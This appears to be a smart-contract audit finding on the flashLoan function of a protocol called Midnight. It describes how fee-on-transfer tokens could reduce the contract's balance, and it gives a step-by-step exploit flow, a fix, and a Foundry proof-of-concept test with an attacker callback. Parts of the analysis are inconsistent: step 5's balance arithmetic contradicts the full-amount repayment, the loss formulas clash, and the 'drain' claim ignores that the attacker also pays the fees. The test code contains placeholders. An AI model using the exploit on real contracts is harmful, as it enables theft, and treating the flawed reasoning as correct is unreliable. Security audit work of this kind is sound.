### Title
Fee-on-Transfer Token Drains Protocol Balance via `flashLoan` Nominal-Amount Repayment - (File: src/Midnight.sol)

### Summary
The `flashLoan` function transfers `assets[i]` out and then pulls `assets[i]` back using the same nominal amount for both legs. With a fee-on-transfer token, each leg deducts a fee, so Midnight receives only `assets[i] * (1 - fee_rate)` on repayment while having disbursed the full `assets[i]`, resulting in a net loss of `assets[i] * fee_rate` per call. No balance-before/after check exists anywhere in the function to detect or prevent this.

### Finding Description
**Exact code path:**

`src/Midnight.sol` lines 737–752:
```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    // ...
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // line 743
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(...) == CALLBACK_SUCCESS, ...
    );
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // line 750
    }
}
```

**Root cause:** Both the outbound `safeTransfer` and the inbound `safeTransferFrom` use the same nominal value `assets[i]`. There is no snapshot of `balanceOf(address(this))` before the loan and no assertion that the balance is restored afterward. `SafeTransferLib` only checks that the call succeeds and returns `true`; it does not verify actual token movement.

**Attacker inputs and exploit flow:**

1. Attacker (any unprivileged caller) identifies or creates a market whose loan/collateral token is a fee-on-transfer token (market creation is permissionless via `touchMarket`), causing Midnight to accumulate a balance `B` of that token.
2. Attacker calls `flashLoan([feeToken], [assets], attackerCallback, "")`.
3. Line 743: `safeTransfer(feeToken, attackerCallback, assets)` — Midnight's balance drops by `assets`; callback receives `assets * (1 - r)` where `r` is the fee rate.
4. `onFlashLoan` returns `CALLBACK_SUCCESS` (attacker controls the callback).
5. Line 750: `safeTransferFrom(feeToken, attackerCallback, address(this), assets)` — callback's balance drops by `assets * (1 - r)` (all it has); Midnight receives `assets * (1 - r) * (1 - r)` if fee applies on `transferFrom` too, or at minimum `assets * (1 - r)` if fee applies only on `transfer`.

   In the single-sided fee case (fee on `transfer` only): Midnight net loss = `assets * r`.
   In the double-sided fee case (fee on both): Midnight net loss = `assets - assets*(1-r)^2 = assets*(2r - r^2)`.

**Why existing checks fail:**

- The only guards are `tokens.length == assets.length` and the callback return value check — neither touches token balances.
- `SafeTransferLib.safeTransferFrom` only verifies the call did not revert and returned `true`; it does not verify the amount actually credited to `address(this)`.
- The Certora `Solvency.spec` explicitly models away this class of token with the comment *"Assume ERC20 tokens transfer correctly: no fee taking from sender or receiver, no rebasing"* — confirming there is no on-chain protection. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
Midnight's token balance for the fee-on-transfer token decreases by `assets[i] * fee_rate` (single-sided) or more (double-sided) on every `flashLoan` call. An attacker can repeat this in a loop (or via `multicall`) until the protocol's entire balance of that token is drained. This directly violates the core invariant that *contract balances cover collateral, credit redemption, fees, and withdrawable assets*, because lenders and borrowers holding positions denominated in that token can no longer be made whole.

### Likelihood Explanation
**Preconditions:**
- Midnight must hold a non-zero balance of a fee-on-transfer token. This is achievable by any user because market creation is permissionless and supply/collateral operations deposit tokens into Midnight.
- The attacker must control a contract implementing `IFlashLoanCallback` that returns `CALLBACK_SUCCESS`.

**Feasibility:** Both preconditions are fully attacker-controlled with no privileged access required. Fee-on-transfer tokens are a well-known ERC20 variant deployed on mainnet. The attack is repeatable with zero cooldown — each `flashLoan` call independently drains `fee_rate * assets[i]` tokens.

### Recommendation
Record the actual balance before disbursement and assert it is fully restored after repayment:

```solidity
// In the repayment loop, replace the current safeTransferFrom with:
uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
require(
    IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore + assets[i],
    FlashLoanNotRepaid()
);
```

Alternatively, snapshot all balances before the outbound loop and verify them after the inbound loop. This is the standard pattern used by Uniswap V2/V3 and Aave V3 flash loans.

```solidity
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// @dev ERC20 that deducts 1% fee on every transfer/transferFrom
contract FeeToken is ERC20 {
    uint256 constant FEE_BPS = 100; // 1%
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount * FEE_BPS / 10_000;
        super._transfer(from, to, amount - fee);
        super._transfer(from, address(0xdead), fee); // burn fee
    }
}

contract FeeOnTransferFlashLoanDrainTest is Test, IFlashLoanCallback {
    Midnight midnight;
    FeeToken feeToken;

    function setUp() public {
        midnight = new Midnight(...);
        feeToken = new FeeToken();
        // Seed Midnight with 1000e18 fee tokens (simulating accumulated deposits)
        deal(address(feeToken), address(midnight), 1000e18);
        // Give this contract enough to repay (it will receive less than assets due to fee)
        deal(address(feeToken), address(this), 1000e18);
        feeToken.approve(address(midnight), type(uint256).max);
    }

    function testFeeOnTransferDrain() public {
        uint256 assets = 100e18;
        uint256 balBefore = feeToken.balanceOf(address(midnight));

        address[] memory tokens = new address[](1);
        tokens[0] = address(feeToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = assets;

        midnight.flashLoan(tokens, amounts, address(this), "");

        uint256 balAfter = feeToken.balanceOf(address(midnight));
        // Assert: Midnight lost fee_rate * assets = 1e18 tokens
        assertLt(balAfter, balBefore, "Midnight balance decreased");
        assertEq(balBefore - balAfter, assets * 100 / 10_000, "Lost exactly fee_rate * assets");
    }

    function onFlashLoan(address, address[] memory tokens, uint256[] memory amounts, bytes memory)
        external returns (bytes32)
    {
        // Approve repayment of full nominal amount; fee token will deduct fee on transferFrom
        IERC20(tokens[0]).approve(msg.sender, amounts[0]);
        return CALLBACK_SUCCESS;
    }

    // Fuzz variant
    function testFuzz_FeeOnTransferDrain(uint256 assets, uint256 feeBps) public {
        feeBps = bound(feeBps, 1, 1000); // 0.01% to 10%
        assets = bound(assets, 1e6, 1000e18);
        // ... same setup with parameterized fee rate
        // assert: balBefore - balAfter == assets * feeBps / 10_000 (±1 for rounding)
    }
}
```

**Expected assertions:**
- `balAfter < balBefore` — Midnight's balance strictly decreases after a round-trip flash loan.
- `balBefore - balAfter ≈ assets * fee_rate` — loss matches the fee-on-transfer deduction.
- Repeated calls converge Midnight's balance to zero, confirming full drain feasibility.
